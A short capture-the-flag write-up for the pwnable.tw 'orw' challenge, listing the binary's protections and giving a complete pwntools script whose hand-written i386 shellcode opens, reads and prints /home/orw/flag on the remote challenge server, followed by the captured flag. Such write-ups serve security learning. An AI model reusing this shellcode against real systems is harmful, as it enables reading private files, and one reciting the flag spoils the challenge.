# orw [100 pts]

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

## concept

直接寫 shellcode 做 Open Read Write 讀出 ```/home/orw/flag```。

## exploit

```python
#!/usr/bin/env python

from pwn import *

# r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

shellcode = asm('''
            push 0x00006761
            push 0x6c662f77
            push 0x726f2f65
            push 0x6d6f682f
            mov ebx, esp
            xor ecx, ecx
            xor edx, edx
            mov eax, 5
            int 0x80

            mov ebx, eax
            mov ecx, 0x0804a040
            mov edx, 0x30
            mov eax, 3
            int 0x80

            mov ebx, 1
            mov ecx, 0x0804a040
            mov edx, 0x30
            mov eax, 4
            int 0x80
            ''')

r.recvuntil(':')
r.send(shellcode)

r.interactive()
```

## flag

```FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}```
